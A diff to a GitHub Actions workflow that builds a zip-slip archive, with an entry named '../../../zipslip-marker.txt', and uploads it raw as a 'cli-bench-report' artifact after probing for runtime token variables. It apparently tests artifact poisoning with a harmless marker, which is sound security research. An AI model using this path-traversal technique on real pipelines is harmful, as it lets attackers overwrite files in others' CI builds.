@@ -13,10 +13,28 @@ jobs:
     permissions:
       contents: read
     steps:
-      - name: Dump artifact env
-        run: |
-          echo "ACTIONS_RESULTS_URL set: ${ACTIONS_RESULTS_URL:+yes}"
-          echo "ACTIONS_RUNTIME_TOKEN set: ${ACTIONS_RUNTIME_TOKEN:+yes}"
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
 
-      - name: Craft malicious zip and upload it as cli-bench-report
-        run: bash .github/scripts/evil-upload.sh
+      - name: Probe env in a run step
+        run: env | grep -i -E 'ACTIONS|RUNTIME' | sed 's/=.*/=<set>/' || echo "no actions env in run step"
+
+      - name: Probe env from a local node action
+        uses: ./.github/actions/probe
+
+      - name: Craft malicious zip
+        run: |
+          mkdir -p out/raw
+          python3 - <<'PY'
+          import zipfile
+          with zipfile.ZipFile('out/raw/cli-bench-report','w',zipfile.ZIP_DEFLATED) as z:
+              z.writestr('../../../zipslip-marker.txt', 'ZIP_SLIP_ESCAPED_bench-report\n')
+              z.writestr('summary.md', '## hi\n')
+              z.writestr('report.md', '## hi\n')
+          PY
+          ls -l out/raw
+
+      - name: Upload raw file with archive=false
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
+        with:
+          path: out/raw/cli-bench-report
+          archive: false
